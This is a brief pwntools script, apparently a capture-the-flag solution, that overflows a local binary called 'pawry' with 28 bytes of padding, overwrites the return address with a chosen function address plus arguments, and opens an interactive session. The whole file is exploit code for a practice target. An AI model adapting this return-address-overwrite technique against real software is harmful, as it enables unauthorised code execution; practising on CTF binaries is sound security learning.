from pwn import *

file_name = './pawry'
binary = ELF(file_name)
padding = cyclic(28)
abhi_ka_time = p32(0x80491e6)
hamari_car = p32(0x0804c028)
payload = padding + abhi_ka_time + hamari_car + hamari_car

target = process(file_name)
target.sendline(payload)
target.interactive()